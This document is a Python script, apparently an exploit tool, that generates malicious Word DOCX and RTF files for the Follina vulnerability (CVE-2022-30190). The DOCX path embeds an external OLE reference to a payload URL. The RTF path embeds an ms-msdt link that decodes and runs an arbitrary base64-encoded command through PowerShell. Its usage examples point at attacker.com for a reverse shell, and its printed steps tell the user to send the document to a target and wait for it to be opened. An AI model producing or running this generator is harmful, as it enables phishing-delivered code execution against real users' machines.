#!/usr/bin/env python3
"""
Title:     Follina Document Generator
Author:    Hyperion Gray Security Team
Homepage:  https://www.hyperiongray.com
Date:      2024-12-15
CVE:       CVE-2022-30190
Advisory:  https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30190

This script generates malicious Office documents that exploit the Follina vulnerability.
"""

import argparse
import zipfile
import os
import logging
from io import BytesIO
import base64

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)


class FollinaDocGenerator:
    """Generate malicious Office documents for Follina exploit"""
    
    # Basic Word document structure
    DOCUMENT_XML = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>Document content</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>"""
    
    # Content types
    CONTENT_TYPES_XML = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>"""
    
    # Root relationships
    ROOT_RELS_XML = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>"""
    
    def __init__(self, payload_url, output_file='exploit.docx'):
        self.payload_url = payload_url
        self.output_file = output_file
        
    def generate_document_rels(self):
        """Generate document.xml.rels with external reference"""
        return f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="{self.payload_url}" TargetMode="External"/>
</Relationships>"""
    
    def create_docx(self):
        """Create a malicious DOCX file"""
        logger.info(f"Generating malicious DOCX: {self.output_file}")
        
        with zipfile.ZipFile(self.output_file, 'w', zipfile.ZIP_DEFLATED) as docx:
            # Add [Content_Types].xml
            docx.writestr('[Content_Types].xml', self.CONTENT_TYPES_XML)
            
            # Add _rels/.rels
            docx.writestr('_rels/.rels', self.ROOT_RELS_XML)
            
            # Add word/document.xml
            docx.writestr('word/document.xml', self.DOCUMENT_XML)
            
            # Add word/_rels/document.xml.rels (this is the key part)
            docx.writestr('word/_rels/document.xml.rels', self.generate_document_rels())
        
        logger.info(f"✓ Malicious document created: {self.output_file}")
        logger.info(f"  Payload URL: {self.payload_url}")
    
    def create_rtf(self, command):
        """Create a malicious RTF file"""
        logger.info(f"Generating malicious RTF: {self.output_file}")
        
        # RTF template with embedded msdt: link
        rtf_template = r"""{{\rtf1{{\field{{\*\fldinst {{HYPERLINK "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{command_b64}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\"" }}}}{{\fldrslt {{}}}}}}}}"""
        
        # Base64 encode the command
        command_b64 = base64.b64encode(command.encode()).decode()
        
        rtf_content = rtf_template.replace('{command_b64}', command_b64)
        
        with open(self.output_file, 'w') as f:
            f.write(rtf_content)
        
        logger.info(f"✓ Malicious RTF created: {self.output_file}")


def main():
    parser = argparse.ArgumentParser(
        description='Follina (CVE-2022-30190) Document Generator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Generate DOCX pointing to payload server
  python3 generate_doc.py --url http://192.168.1.100:8080/payload.html --output exploit.docx

  # Generate RTF with embedded command
  python3 generate_doc.py --format rtf --command "calc.exe" --output exploit.rtf

  # Generate DOCX for reverse shell
  python3 generate_doc.py --url http://attacker.com/payload.html --output shell.docx
        """
    )
    
    parser.add_argument('--url', help='URL to payload HTML file (for DOCX)')
    parser.add_argument('--command', help='Command to execute (for RTF)')
    parser.add_argument('--output', required=True, help='Output filename')
    parser.add_argument('--format', choices=['docx', 'rtf'], default='docx', 
                       help='Document format (default: docx)')
    
    args = parser.parse_args()
    
    if args.format == 'docx':
        if not args.url:
            parser.error("--url is required for DOCX format")
        
        generator = FollinaDocGenerator(args.url, args.output)
        generator.create_docx()
        
        logger.info("\nNext steps:")
        logger.info("1. Start the payload server: python3 serve_payload.py")
        logger.info("2. Send the document to the target")
        logger.info("3. Wait for the target to open the document")
        
    elif args.format == 'rtf':
        if not args.command:
            parser.error("--command is required for RTF format")
        
        generator = FollinaDocGenerator('', args.output)
        generator.create_rtf(args.command)
        
        logger.info("\nRTF document created with embedded command")
        logger.info("Send this document to the target and wait for them to open it")


if __name__ == '__main__':
    main()
